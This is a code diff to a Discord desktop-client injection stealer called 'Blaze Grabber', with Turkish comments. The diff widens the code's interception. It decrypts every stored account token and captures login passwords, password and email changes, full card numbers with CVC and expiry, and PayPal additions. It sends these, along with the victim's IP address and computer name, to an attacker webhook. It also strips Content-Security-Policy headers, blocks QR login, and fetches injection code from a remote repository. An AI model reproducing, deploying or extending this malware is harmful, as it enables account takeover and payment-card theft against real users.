@@ -8,20 +8,24 @@ const https       = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session, safeStorage } = require('electron');
 
+// ── Config ────────────────────────────────────────────────────────────────────
 const WEBHOOK    = '%WEBHOOK%';
 const AVATAR_URL = 'https://i.imgur.com/CHB4vW7.gif';
 const EMBED_COLOR = 0x8563FF;
 const BOT_NAME   = 'Blaze Grabber';
 const INJECT_URL = 'https://raw.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';
 
+// ── State ─────────────────────────────────────────────────────────────────────
 let _initDone   = false;
 let _updateDone = false;
 
+// ── execScript ────────────────────────────────────────────────────────────────
 const execScript = (script) => {
     const win = BrowserWindow.getAllWindows()[0];
     return win.webContents.executeJavaScript(script, true);
 };
 
+// localStorage'dan TÜM hesapların şifreli tokenlarını al, main process'te çöz
 const GET_ALL_TOKENS_SCRIPT = `(function(){
     try {
         var f = document.createElement('iframe');
@@ -29,9 +33,9 @@ const GET_ALL_TOKENS_SCRIPT = `(function(){
         var ls = Object.getOwnPropertyDescriptor(f.contentWindow,'localStorage').get.call(window);
         f.remove();
         var result = [];
-        
+        // Tek token (aktif hesap)
         if (ls.token) result.push(ls.token);
-        
+        // Multi-account: "tokens" key — object veya array
         try {
             var multi = ls.tokens;
             if (multi) {
@@ -43,7 +47,7 @@ const GET_ALL_TOKENS_SCRIPT = `(function(){
                 }
             }
         } catch(e) {}
-        
+        // MultiAccountStore
         try {
             var mas = ls.MultiAccountStore;
             if (mas) {
@@ -70,7 +74,7 @@ async function getAllTokens(retries = 8, delayMs = 2000) {
                             const token = safeStorage.decryptString(buf);
                             if (token && !tokens.includes(token)) tokens.push(token);
                         } else if (enc && !enc.includes('dQw4w9WgXcQ:')) {
-                            
+                            // Plain token (eski format)
                             if (!tokens.includes(enc)) tokens.push(enc);
                         }
                     } catch {}
@@ -83,6 +87,7 @@ async function getAllTokens(retries = 8, delayMs = 2000) {
     return [];
 }
 
+// Geriye dönük uyumluluk — tek token gerektiğinde
 async function getToken(retries = 3, delayMs = 1000) {
     const tokens = await getAllTokens(retries, delayMs);
     return tokens.length > 0 ? tokens[0] : null;
@@ -90,6 +95,9 @@ async function getToken(retries = 3, delayMs = 1000) {
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
+// ── HTTP helpers ──────────────────────────────────────────────────────────────
+
+// Discord API — https ile direkt (token header ile, renderer'a gerek yok)
 function apiGet(endpoint, token) {
     return new Promise(resolve => {
         const url = new URL(endpoint);
@@ -157,6 +165,9 @@ async function postWebhook(payload) {
     });
 }
 
+// ── Badge / Nitro / Billing helpers ──────────────────────────────────────────
+
+// Badge ID → emoji map (custom emojiler)
 const PROFILE_BADGE_MAP = {
     'staff':                    '<:discordstaff:1533643624447742103>',
     'partner':                  '<:discordpartner:1533643693444038698>',
@@ -216,6 +227,8 @@ function parseBilling(sources) {
     return parts.length ? parts.join(' ') : '<:no:1533642070701641889>';
 }
 
+// ── Embed builder ─────────────────────────────────────────────────────────────
+
 function buildPayload(title, fields, thumbnail, image) {
     const embed = {
         title,
@@ -236,7 +249,7 @@ async function buildUserInfo(token) {
     ]);
     if (!user || user.message) return null;
 
-    
+    // Profile — renderer üzerinden çağır (Discord'un kendi session'ı, CORS/auth sorunu yok)
     try {
         const profileJson = await execScript(`(function(){
             var x = new XMLHttpRequest();
@@ -263,7 +276,7 @@ async function buildUserInfo(token) {
 }
 
 function buildFields(user, billing, friends, token, extra) {
-    
+    // Billing — tüm kartları say (expired dahil)
     const cards   = (billing || []).filter(s => s.type === 1).length;
     const paypals = (billing || []).filter(s => s.type === 2).length;
     const billingParts = [];
@@ -271,20 +284,20 @@ function buildFields(user, billing, friends, token, extra) {
     if (paypals) billingParts.push(`\`${paypals} PayPal${paypals > 1 ? 's' : ''} found\``);
     const billingVal = billingParts.length ? billingParts.join(' ') : '<:no:1533642070701641889>';
 
-    
+    // 3 grup, aralarında boş satır — Discord Info tarzı
     const info = [
-        
+        // Grup 1: Kimlik
         `<:user:1533638622761455637> **Username:** \`${user.username}\``,
         `<:mail:1533638816559140877> **Email:** \`${user.email || 'N/A'}\``,
         `<:phone:1533639066057179136> **Phone:** \`${user.phone || 'N/A'}\``,
         '',
-        
+        // Grup 2: Hesap
         `<:lock:1533640371882557501> **2FA:** ${user.mfa_enabled ? '<:tick:1533641966632435936>' : '<:no:1533642070701641889>'}`,
         `<:nitro:1533639641687920823> **Nitro:** ${getNitro(user)}`,
         `<:card:1533639749376671785> **Billing:** ${billingVal}`,
         `<:badge:1533639967761240154> **Badges:** ${getBadges(user)}`,
         '',
-        
+        // Grup 3: Sistem (extra)
         ...(extra || []),
     ].join('\n');
 
@@ -301,6 +314,8 @@ function getDiscordClientName() {
     }
     return 'Discord';
 }
+
+// ── firstTime ─────────────────────────────────────────────────────────────────
 
 async function firstTime() {
     if (_initDone) return;
@@ -330,7 +345,7 @@ async function firstTime() {
             return;
         }
 
-        
+        // Her hesap için ayrı embed
         for (const token of tokens) {
             try {
                 const info = await buildUserInfo(token);
@@ -351,6 +366,8 @@ async function firstTime() {
         }
     } catch {}
 }
+
+// ── updateCheck ───────────────────────────────────────────────────────────────
 
 function updateCheck() {
     if (_updateDone) return;
@@ -394,6 +411,8 @@ function updateCheck() {
     } catch {}
 }
 
+// ── uploadData parse ──────────────────────────────────────────────────────────
+
 function parseUploadData(details) {
     try {
         if (!details.uploadData || !details.uploadData[0]) return null;
@@ -404,41 +423,141 @@ function parseUploadData(details) {
     } catch { return null; }
 }
 
+// ── onCompleted ───────────────────────────────────────────────────────────────
+
 session.defaultSession.webRequest.onCompleted({
     urls: [
         'https://discord.com/api/v*/users/@me',
         'https://discordapp.com/api/v*/users/@me',
+        'https://*.discord.com/api/v*/users/@me',
         'https://discord.com/api/v*/auth/login',
         'https://discordapp.com/api/v*/auth/login',
-        'https://api.braintreegateway.com/merchants/*/payment_methods/paypal_accounts',
+        'https://*.discord.com/api/v*/auth/login',
+        'https://api.braintreegateway.com/merchants/*/client_api/v*/payment_methods/paypal_accounts',
         'https://api.stripe.com/v*/tokens',
+        'https://api.stripe.com/v*/setup_intents/*/confirm',
+        'https://api.stripe.com/v*/payment_intents/*/confirm',
+    ],
+}, async (details) => {
+    if (details.statusCode !== 200 && details.statusCode !== 202) return;
+    if (!['POST', 'PATCH'].includes(details.method)) return;
+
+    const data = parseUploadData(details);
+    if (!data) return;
+
+    const token = await getToken(3, 1000);
+    if (!token) return;
+
+    const ip     = await getIP();
+    const client = getDiscordClientName();
+    const info   = await buildUserInfo(token);
+    if (!info) return;
+
+    const { user, billing, avatar, banner } = info;
+    const base = [
+        `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || 'N/A'}\``,
+        `<:ip:1533640242437816390> **IP:** \`${ip}\``,
+        `<:web:1533641362975621270> **Client:** \`${client}\``,
+    ];
+
+    switch (true) {
+        case details.url.endsWith('login'):
+            if (!data.password) return;
+            await postWebhook(buildPayload(
+                'Discord — Login Captured',
+                buildFields(user, billing, null, token, [
+                    ...base,
+                    `<:token:1533639840254660640> **Password:** \`${data.password}\``,
+                ]),
+                avatar || AVATAR_URL, banner || null
+            ));
+            break;
+
+        case details.url.endsWith('users/@me') && details.method === 'PATCH':
+            if (!data.password) return;
+            if (data.new_password) {
+                await postWebhook(buildPayload(
+                    'Discord — Password Changed',
+                    buildFields(user, billing, null, token, [
+                        ...base,
+                        `<:token:1533639840254660640> **Old Password:** \`${data.password}\``,
+                        `<:token:1533639840254660640> **New Password:** \`${data.new_password}\``,
+                    ]),
+                    avatar || AVATAR_URL, banner || null
+                ));
+            }
+            if (data.email) {
+                await postWebhook(buildPayload(
+                    'Discord — Email Changed',
+                    buildFields(user, billing, null, token, [
+                        ...base,
+                        `<:mail:1533638816559140877> **New Email:** \`${data.email}\``,
+                        `<:token:1533639840254660640> **Password:** \`${data.password}\``,
+                    ]),
+                    avatar || AVATAR_URL, banner || null
+                ));
+            }
+            break;
+
+        case details.url.includes('api.stripe.com') && details.url.endsWith('tokens'):
+            await postWebhook(buildPayload(
+                'Discord — Credit Card Added',
+                buildFields(user, billing, null, token, [
+                    ...base,
+                    `<:card:1533639749376671785> **Card:** \`${data['card[number]'] || 'N/A'}\``,
+                    `<:lock:1533640371882557501> **CVC:** \`${data['card[cvc]'] || 'N/A'}\``,
+                    `<:card:1533639749376671785> **Expiry:** \`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``,
+                ]),
+                avatar || AVATAR_URL, banner || null
+            ));
+            break;
+
+        case details.url.includes('paypal_accounts'):
+            await postWebhook(buildPayload(
+                'Discord — PayPal Added',
+                buildFields(user, billing, null, token, base),
+                avatar || AVATAR_URL, banner || null
+            ));
+            break;
+
+        default:
+            break;
+    }
+});
+
+// ── onBeforeRequest ───────────────────────────────────────────────────────────
+
+session.defaultSession.webRequest.onBeforeRequest({
+    urls: [
+        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
+        'https://*.discord.com/api/v*/applications/detectable',
         'https://discord.com/api/v*/applications/detectable',
+        'https://*.discord.com/api/v*/users/@me/library',
         'https://discord.com/api/v*/users/@me/library',
+        'wss://remote-auth-gateway.discord.gg/*',
     ],
 }, (details, callback) => {
+    if (details.url.startsWith('wss://remote-auth-gateway')) {
+        return callback({ cancel: true });
+    }
     firstTime().catch(() => {});
     updateCheck();
     callback({});
 });
 
-// QR login engeli — WebSocket bağlantısı açılmadan önce iptal et
-session.defaultSession.webRequest.onBeforeRequest({
-    urls: ['wss://remote-auth-gateway.discord.gg/*'],
-}, (details, callback) => {
-    callback({ cancel: true });
-});
+// ── onHeadersReceived ─────────────────────────────────────────────────────────
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    const headers = details.responseHeaders || {};
-    // CSP'yi hem lowercase hem uppercase key formatında sil
-    for (const key of Object.keys(headers)) {
-        const lower = key.toLowerCase();
-        if (lower === 'content-security-policy' || lower === 'content-security-policy-report-only') {
-            delete headers[key];
-        }
-    }
-    headers['Access-Control-Allow-Headers'] = ['*'];
-    callback({ responseHeaders: headers });
+    delete details.responseHeaders['content-security-policy'];
+    delete details.responseHeaders['content-security-policy-report-only'];
+    callback({
+        responseHeaders: {
+            ...details.responseHeaders,
+            'Access-Control-Allow-Headers': ['*'],
+        },
+    });
 });
+
+// ── Discord core yükle ────────────────────────────────────────────────────────
 
 module.exports = require('./core.asar');
